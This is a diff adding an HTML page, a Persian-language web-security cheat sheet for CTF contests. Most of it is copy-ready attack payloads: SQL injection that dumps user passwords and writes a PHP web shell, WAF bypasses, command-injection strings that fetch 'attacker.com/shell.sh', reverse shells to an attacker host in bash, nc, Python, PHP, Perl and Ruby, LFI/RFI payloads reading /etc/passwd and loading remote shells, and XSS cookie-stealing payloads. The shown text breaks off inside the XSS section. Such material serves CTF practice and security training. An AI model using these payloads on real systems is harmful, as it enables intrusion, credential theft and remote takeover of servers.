@@ -1,0 +1,1600 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Security Ultimate Cheat Sheet - Final Edition</title>
+    <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <style>
+        :root {
+            --bg-color: #0d1117;
+            --card-bg: #161b22;
+            --border-color: #30363d;
+            --text-color: #c9d1d9;
+            --muted-color: #8b949e;
+            --primary-color: #39d353; /* Hacker Green for Ultimate */
+            --accent-color: #56d364;  /* Light Green accent */
+            --warn-color: #e3b341;
+            --danger-color: #f85149;
+            --code-bg: #010409;
+            --hover-bg: #1f2937;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Vazirmatn', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            display: flex;
+            min-height: 100vh;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 300px;
+            background-color: var(--card-bg);
+            border-left: 1px solid var(--border-color);
+            padding: 20px;
+            position: fixed;
+            height: 100vh;
+            overflow-y: auto;
+            flex-shrink: 0;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .sidebar-header {
+            margin-bottom: 20px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 15px;
+        }
+
+        .sidebar-header h1 {
+            color: var(--primary-color);
+            font-size: 1.4rem;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+
+        .sidebar-header p {
+            color: var(--muted-color);
+            font-size: 0.8rem;
+            text-align: center;
+        }
+
+        .search-box {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .search-box input {
+            width: 100%;
+            padding: 10px 15px;
+            background-color: var(--bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-color);
+            font-family: 'Vazirmatn', sans-serif;
+            font-size: 0.9rem;
+            transition: all 0.2s;
+        }
+
+        .search-box input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(57, 211, 83, 0.2);
+        }
+
+        .nav-list {
+            list-style: none;
+            flex: 1;
+            overflow-y: auto;
+        }
+
+        .nav-list li {
+            margin-bottom: 5px;
+        }
+
+        .nav-list li a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 12px;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+            font-size: 0.9rem;
+            border-right: 3px solid transparent;
+        }
+
+        .nav-list li a:hover {
+            background-color: var(--hover-bg);
+            color: var(--primary-color);
+        }
+
+        .nav-list li a.active {
+            background-color: rgba(57, 211, 83, 0.1);
+            color: var(--primary-color);
+            border-right: 3px solid var(--primary-color);
+            font-weight: bold;
+        }
+
+        .nav-badge {
+            font-size: 0.7rem;
+            background: var(--bg-color);
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: var(--muted-color);
+        }
+
+        /* Main Content */
+        .main-content {
+            margin-right: 300px;
+            padding: 40px;
+            flex: 1;
+            max-width: 1100px;
+        }
+
+        .main-header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        .main-header h1 {
+            color: var(--primary-color);
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(57, 211, 83, 0.3);
+        }
+
+        .main-header p {
+            color: var(--muted-color);
+            font-size: 1.1rem;
+        }
+
+        /* Tool Sections */
+        .tool-section {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 40px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.2);
+            scroll-margin-top: 20px;
+        }
+
+        .tool-title {
+            color: var(--accent-color);
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 15px;
+        }
+
+        /* Badges & Tags */
+        .goal-box {
+            background: rgba(57, 211, 83, 0.1);
+            border: 1px solid rgba(57, 211, 83, 0.2);
+            border-right: 4px solid var(--primary-color);
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 25px;
+            color: var(--primary-color);
+        }
+
+        .sub-title {
+            color: var(--text-color);
+            margin: 25px 0 15px 0;
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .tag {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        .tag-base { background: rgba(57, 211, 83, 0.2); color: var(--primary-color); }
+        .tag-ctf { background: rgba(86, 211, 100, 0.2); color: var(--accent-color); }
+        .tag-tip { background: rgba(227, 179, 65, 0.2); color: var(--warn-color); }
+
+        /* Code Blocks (Terminal Style) */
+        .code-container {
+            position: relative;
+            margin: 15px 0;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            background: var(--code-bg);
+        }
+
+        .code-header {
+            background: #161b22;
+            padding: 8px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .code-dots {
+            display: flex;
+            gap: 6px;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+        .dot-red { background: #ff5f56; }
+        .dot-yellow { background: #ffbd2e; }
+        .dot-green { background: #27c93f; }
+
+        .code-lang {
+            color: var(--muted-color);
+            font-size: 0.8rem;
+            font-family: monospace;
+        }
+
+        .copy-btn {
+            background: transparent;
+            color: var(--muted-color);
+            border: 1px solid var(--border-color);
+            padding: 4px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.75rem;
+            transition: all 0.2s;
+            font-family: 'Vazirmatn', sans-serif;
+        }
+
+        .copy-btn:hover {
+            background: var(--primary-color);
+            color: #000;
+            border-color: var(--primary-color);
+        }
+
+        pre {
+            background-color: var(--code-bg) !important;
+            padding: 15px !important;
+            border-radius: 0;
+            overflow-x: auto;
+            margin: 0;
+            direction: ltr;
+            text-align: left;
+            max-height: 600px;
+        }
+
+        code {
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+
+        /* Table Styles */
+        .table-container {
+            overflow-x: auto;
+            margin: 20px 0;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--card-bg);
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: right;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        th {
+            background-color: var(--bg-color);
+            color: var(--primary-color);
+            font-weight: bold;
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover td {
+            background-color: var(--hover-bg);
+        }
+
+        /* Checklist & Special Blocks */
+        .checklist-box {
+            background: rgba(86, 211, 100, 0.05);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        .checklist-box ul {
+            list-style: none;
+        }
+        .checklist-box li {
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        .checklist-box li::before {
+            content: "☐";
+            color: var(--primary-color);
+            font-size: 1.2rem;
+            margin-left: 10px;
+        }
+
+        .tip-box {
+            background: rgba(227, 179, 65, 0.05);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        .tip-box ol {
+            padding-right: 20px;
+        }
+        .tip-box li {
+            margin-bottom: 10px;
+        }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            body { flex-direction: column; }
+            .sidebar {
+                position: relative;
+                width: 100%;
+                height: auto;
+                border-left: none;
+                border-bottom: 1px solid var(--border-color);
+            }
+            .main-content {
+                margin-right: 0;
+                padding: 20px;
+                width: 100%;
+            }
+            .nav-list { max-height: 200px; }
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-color); }
+        ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--primary-color); }
+    </style>
+</head>
+<body>
+
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <div class="sidebar-header">
+            <h1>🏆 WEB SEC ULTIMATE</h1>
+            <p>CTF Master Guide - Final</p>
+        </div>
+        <div class="search-box">
+            <input type="text" id="searchInput" placeholder="🔎 جستجوی فاز..." oninput="filterTools()">
+        </div>
+        <ul class="nav-list" id="navList">
+            <li><a href="#intro">🎯 هدف نهایی <span class="nav-badge">Goal</span></a></li>
+            <li><a href="#phase0">فاز ۰: Recon <span class="nav-badge">Info</span></a></li>
+            <li><a href="#phase1">فاز ۱: Enumeration <span class="nav-badge">Advanced</span></a></li>
+            <li><a href="#phase2">فاز ۲: SQLi <span class="nav-badge">Advanced</span></a></li>
+            <li><a href="#phase3">فاز ۳: CMD Injection <span class="nav-badge">RCE</span></a></li>
+            <li><a href="#phase4">فاز ۴: LFI/RFI <span class="nav-badge">Bypass</span></a></li>
+            <li><a href="#phase5">فاز ۵: XSS <span class="nav-badge">Advanced</span></a></li>
+            <li><a href="#phase6">فاز ۶: Auth & JWT <span class="nav-badge">CSRF</span></a></li>
+            <li><a href="#phase7">فاز ۷: File Upload <span class="nav-badge">Shell</span></a></li>
+            <li><a href="#phase8">فاز ۸: Advanced Tech <span class="nav-badge">SSRF/XXE</span></a></li>
+            <li><a href="#phase9">فاز ۹: Tools <span class="nav-badge">Auto</span></a></li>
+            <li><a href="#checklist">چک‌لیست نهایی <span class="nav-badge">100%</span></a></li>
+            <li><a href="#tips">نکات طلایی <span class="nav-badge">Pro</span></a></li>
+            <li><a href="#machines">ماشین‌های پیشنهادی <span class="nav-badge">Practice</span></a></li>
+        </ul>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <header class="main-header">
+            <h1>چیت‌شیت فوق‌جامع وب‌سکیوریتی (Ultimate)</h1>
+            <p>نسخه نهایی و ایمن برای مسابقات حرفه‌ای CTF - نمایش کدها بدون اجرا</p>
+        </header>
+
+        <!-- Intro -->
+        <section id="intro" class="tool-section">
+            <h2 class="tool-title">🎯 هدف نهایی</h2>
+            <div class="goal-box">
+                تسلط کامل بر شناسایی و بهره‌برداری دستی از آسیب‌پذیری‌های وب با رویکرد <strong>سیستماتیک، گام‌به‌گام و بدون ابزار اتوماتیک</strong> مناسب برای مسابقات CTF و تست‌نفوذ واقعی.
+            </div>
+        </section>
+
+        <!-- Phase 0 -->
+        <section id="phase0" class="tool-section">
+            <h2 class="tool-title">📋 فاز ۰: آماده‌سازی و جمع‌آوری اطلاعات (Reconnaissance)</h2>
+            
+            <h3 class="sub-title">۱. شناسایی دامنه و زیردامنه‌ها</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ابزارهای پیشرفته
+sublist3r -d target.com -o subdomains.txt
+amass enum -passive -d target.com -o amass.txt
+assetfinder --subs-only target.com
+findomain -t target.com
+
+# جستجوی دستی
+dig target.com ANY
+nslookup -type=ANY target.com
+host -t A target.com
+
+# Google Dorking برای زیردامنه
+site:*.target.com</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. شناسایی فناوری‌های وب‌سرور</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ابزارها
+whatweb -a 3 target.com
+wappalyzer (افزونه مرورگر)
+builtwith.com
+
+# دستی
+curl -I target.com
+curl -s target.com | head -n 50</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. اسکن پورت‌های پیشرفته</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># اسکن کامل با nmap
+nmap -sC -sV -p- --min-rate=1000 -T4 target.com
+nmap -sU --top-ports 100 target.com  # UDP scan
+
+# اسکن با masscan (سریع‌تر)
+masscan -p1-65535 --rate=10000 target.com</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 1 -->
+        <section id="phase1" class="tool-section">
+            <h2 class="tool-title">📂 فاز ۱: Enumeration پیشرفته (حرفه‌ای)</h2>
+            
+            <h3 class="sub-title">۱. کشف دایرکتوری و فایل (Directory Busting)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># gobuster با دیکشنری‌های مختلف
+gobuster dir -u target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,old,sql,log,conf,ini,sh,pl,py,cgi -t 50
+
+# ffuf با فیلترهای پیشرفته
+ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404,403,301 -c -v
+ffuf -u http://target.com/FUZZ -w wordlist.txt -fr "Not Found|404"  # فیلتر بر اساس regex
+
+# پیدا کردن فایل‌های با پسوندهای خاص
+ffuf -u http://target.com/indexFUZZ -w /usr/share/wordlists/extensions.txt
+
+# کشف دایرکتوری‌های تودرتو
+ffuf -u http://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. شناسایی فایل‌های حساس و پشتیبان (CTF Critical)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># فایل‌های حیاتی در CTF
+.git/HEAD
+.svn/entries
+.env
+.DS_Store
+.htaccess
+.htpasswd
+web.config
+robots.txt
+sitemap.xml
+crossdomain.xml
+clientaccesspolicy.xml
+
+# فایل‌های پشتیبان
+index.php.bak
+index.php.old
+index.php~
+config.php.save
+wp-config.php~
+database.sql
+dump.sql
+backup.tar.gz</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. شناسایی CMS و ورژن دقیق</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># WordPress
+wpscan --url target.com --enumerate vp,vt,u
+# دستی: /wp-content/readme.html, /wp-includes/version.php
+
+# Drupal
+droopescan scan drupal -u target.com
+# دستی: /CHANGELOG.txt, /core/INSTALL.txt
+
+# Joomla
+joomscan --url target.com
+# دستی: /administrator, /README.txt, /configuration.php
+
+# Laravel
+/.env, /storage/logs/laravel.log
+
+# Django
+/admin/, /static/, /media/</code></pre>
+            </div>
+
+            <h3 class="sub-title">۴. تحلیل هدرهای HTTP</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># با curl
+curl -I target.com
+curl -v target.com
+
+# هدرهای مهم
+X-Powered-By: نشان‌دهنده فناوری
+Server: نوع وب‌سرور و ورژن
+Set-Cookie: نوع سشن (PHPSESSID, JSESSIONID, etc.)
+X-XSS-Protection: وجود XSS protection
+Content-Security-Policy: وجود CSP</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 2 -->
+        <section id="phase2" class="tool-section">
+            <h2 class="tool-title">💉 فاز ۲: SQL Injection (پیشرفته و کامل)</h2>
+            
+            <h3 class="sub-title">۱. تشخیص (Detection) - تمام حالات</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">sql</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-sql"># خطای پایه
+'
+"
+\
+; -- -
+
+# Boolean-based
+' AND 1=1-- -
+' AND 1=2-- -
+1' AND '1'='1
+1' AND '1'='2
+
+# Time-based
+' AND SLEEP(5)-- -
+' AND BENCHMARK(1000000,MD5('a'))-- -
+' WAITFOR DELAY '0:0:5'-- -  (MSSQL)
+1' AND pg_sleep(5)-- -  (PostgreSQL)
+
+# Error-based
+' AND extractvalue(1,concat(0x7e,database()))-- -
+' AND updatexml(1,concat(0x7e,database()),1)-- -</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. بهره‌برداری (Exploitation) - MySQL/MariaDB</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">sql</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-sql"># تعداد ستون‌ها
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+' UNION SELECT NULL,NULL,NULL-- -
+
+# استخراج دیتابیس
+' UNION SELECT database(),user(),version()-- -
+
+# استخراج جداول
+' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()-- -
+' UNION SELECT table_name,column_name,3 FROM information_schema.columns-- -
+
+# دامپ کردن
+' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT username,password,3 FROM users-- -
+
+# استخراج با GROUP_CONCAT
+' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables-- -
+
+# تزریق به فایل
+' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '&lt;?php system($_GET["cmd"]); ?&gt;'-- -</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. بهره‌برداری - PostgreSQL, MSSQL, Oracle</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">sql</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-sql"># PostgreSQL:
+' UNION SELECT current_database(),current_user,version()-- -
+' UNION SELECT table_name,2 FROM information_schema.tables-- -
+' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
+
+# MSSQL:
+' UNION SELECT DB_NAME(),user_name(),@@version-- -
+' UNION SELECT name,2 FROM sysobjects WHERE xtype='U'-- -
+' UNION SELECT name,2 FROM syscolumns WHERE id=OBJECT_ID('users')-- -
+'; EXEC xp_cmdshell('whoami')-- -  # اگر فعال باشد
+
+# Oracle:
+' UNION SELECT banner,2 FROM v$version-- -
+' UNION SELECT table_name,2 FROM all_tables-- -
+' UNION SELECT column_name,2 FROM all_tab_columns WHERE table_name='USERS'-- -</code></pre>
+            </div>
+
+            <h3 class="sub-title">۴. دور زدن WAF و فیلترها (تکنیک‌های پیشرفته)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">sql</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-sql"># تغییر Case
+SeLeCt, UnIoN, Or, AnD
+
+# URL Encoding چندلایه
+%2527, %2520, %252f
+
+# کامنت‌های توکار
+/*!50000SELECT*/
+/*!50000UNION*/
+
+# استفاده از CONCAT و CHAR
+' UNION SELECT CONCAT(0x75,0x73,0x65,0x72),2,3-- -
+' UNION SELECT CHAR(117,115,101,114),2,3-- -
+
+# استفاده از HEX
+' UNION SELECT 0x75736572,2,3-- -
+
+# Space Bypass
+/**/
+%0a (newline)
+%0b (vertical tab)
+%09 (tab)
+%0c (form feed)
+
+# = Bypass
+LIKE
+IN
+REGEXP
+RLIKE
+
+# AND/OR Bypass
+&amp;&amp;
+||
+XOR
+&amp;
+|
+
+# استفاده از اطلاعات شماتا
+information_schema.tables -> mysql.innodb_table_stats
+information_schema.columns -> sys.schema_table_statistics
+
+# بدون اطلاعات شماتا
+' UNION SELECT a,b,c FROM (SELECT 1 a,2 b,3 c UNION SELECT * FROM users) x-- -</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 3 -->
+        <section id="phase3" class="tool-section">
+            <h2 class="tool-title">🖥️ فاز ۳: Command Injection (پیشرفته)</h2>
+            
+            <h3 class="sub-title">۱. تکنیک‌های تزریق</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># جداکننده‌های دستور
+; whoami
+| whoami
+|| whoami
+&amp;&amp; whoami
+`whoami`
+ $(whoami)
+%0a whoami
+%0d%0a whoami
+
+# اجرای چند دستور
+; id; ls -la
+| id | ls -la
+
+# با Bypass فیلتر
+; w'h'o'a'm'i
+; `echo whoami`
+; $(echo whoami)
+; wget${IFS}attacker.com/shell.sh
+; wget$(printf%20attacker.com)</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. Reverse Shell (تمام روش‌ها)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># Netcat
+nc -e /bin/bash attacker 4444
+nc -e /bin/sh attacker 4444
+nc.traditional -e /bin/bash attacker 4444
+
+# Bash
+bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1
+/bin/bash -i &gt; /dev/tcp/attacker/4444 0&lt;&amp;1 2&gt;&amp;1
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+
+# PHP
+php -r '$sock=fsockopen("attacker",4444);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+
+# Perl
+perl -e 'use Socket;$i="attacker";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'
+
+# Ruby
+ruby -rsocket -e 'f=TCPSocket.open("attacker",4444).to_i;exec sprintf("/bin/bash -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
+
+# Telnet
+rm -f /tmp/backpipe; mknod /tmp/backpipe p; telnet attacker 4444 0&lt;/tmp/backpipe | /bin/bash 1&gt;/tmp/backpipe</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 4 -->
+        <section id="phase4" class="tool-section">
+            <h2 class="tool-title">📂 فاز ۴: LFI/RFI (پیشرفته کامل)</h2>
+            
+            <h3 class="sub-title">۱. Local File Inclusion (LFI) - تمام تکنیک‌ها</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">php</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-php"># مسیرهای اصلی
+?file=../../../../etc/passwd
+?file=..\..\..\windows\win.ini
+?file=../../../../../../../../etc/passwd
+?file=/etc/passwd
+
+# Bypass با چند برابر کردن
+?file=....//....//....//etc/passwd
+?file=....\/....\/....\/etc/passwd
+?file=..././..././..././etc/passwd
+
+# با URL Encoding
+?file=..%252f..%252f..%252fetc%252fpasswd
+?file=..%2f..%2f..%2fetc%2fpasswd
+
+# Null Byte (PHP &lt; 5.3)
+?file=../../../../etc/passwd%00
+
+# با پسوند اجباری
+?file=../../../../etc/passwd%00.jpg
+?file=../../../../etc/passwd%00.png
+
+# فایل‌های لاگ
+?file=../../../../var/log/apache/access.log
+?file=../../../../var/log/apache/error.log
+?file=../../../../var/log/nginx/access.log
+?file=../../../../var/log/mysql/error.log
+?file=../../../../var/log/auth.log
+
+# Proc Files
+?file=../../../../proc/self/environ
+?file=../../../../proc/self/fd/0
+?file=../../../../proc/self/fd/1
+?file=../../../../proc/self/fd/2
+
+# PHP Filters (خواندن سورس کد)
+?file=php://filter/convert.base64-encode/resource=index.php
+?file=php://filter/convert.base64-encode/resource=config.php
+?file=php://filter/convert.base64-encode/resource=../config.php
+?file=php://filter/zlib.deflate|convert.base64-encode/resource=config.php
+
+# PHP Input (اجرای کد - اگر allow_url_include=On)
+?file=php://input
+POST: &lt;?php system('id'); ?&gt;
+
+# PHP Expect (اجرای دستور - نیاز به expect module)
+?file=expect://id
+?file=expect://ls -la
+
+# PHP Session Poisoning
+?file=../../../../var/lib/php/sessions/sess_SESSIONID
+?file=../../../../tmp/sess_SESSIONID
+
+# با دستکاری کوکی
+Cookie: PHPSESSID=&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. Remote File Inclusion (RFI)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># HTTP
+?file=http://attacker.com/shell.txt
+?file=http://attacker.com/shell.php
+
+# HTTPS
+?file=https://attacker.com/shell.txt
+
+# FTP
+?file=ftp://attacker.com/shell.txt
+
+# Wrapper Bypass
+?file=http://attacker.com/shell.txt?cmd=id
+?file=http://attacker.com/shell.txt%00
+
+# با فایل‌های با پسوند مجاز
+?file=http://attacker.com/shell.jpg?cmd=id
+
+# Data URI (اجرای کد مستقیم)
+?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdfQ09NTUFORF9fJyk7ID8+
+
+# با log poisoning
+?page=../../../../var/log/apache/access.log
+# سپس User-Agent را به کد PHP تغییر دهید</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 5 -->
+        <section id="phase5" class="tool-section">
+            <h2 class="tool-title">🚨 فاز ۵: XSS (پیشرفته کامل)</h2>
+            
+            <h3 class="sub-title">۱. انواع XSS با Payloadهای مختلف</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">html</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-html">&lt;!-- پایه --&gt;
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;script&gt;confirm('XSS')&lt;/script&gt;
+&lt;script&gt;prompt('XSS')&lt;/script&gt;
+
+&lt;!-- با Event Handlers --&gt;
+&lt;body onload=alert('XSS')&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;img src=javascript:alert('XSS')&gt;
+&lt;svg/onload=alert('XSS')&gt;
+&lt;marquee onscroll=alert('XSS')&gt;
+&lt;details open ontoggle=alert('XSS')&gt;
+
+&lt;!-- با تگ‌های قدیمی --&gt;
+&lt;embed src=javascript:alert('XSS')&gt;
+&lt;object data=javascript:alert('XSS')&gt;
+&lt;iframe src=javascript:alert('XSS')&gt;
+&lt;video src=javascript:alert('XSS')&gt;
+&lt;audio src=javascript:alert('XSS')&gt;
+
+&lt;!-- با کلیک --&gt;
+&lt;a href=javascript:alert('XSS')&gt;click me&lt;/a&gt;
+&lt;a href="javascript:alert(document.cookie)"&gt;click&lt;/a&gt;
+
+&lt;!-- بدون اسکریپت --&gt;
+javascript:alert('XSS')
+&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert('XSS')
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+
+&lt;!-- با Filter Bypass --&gt;
+&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;script&gt;ipt&gt;
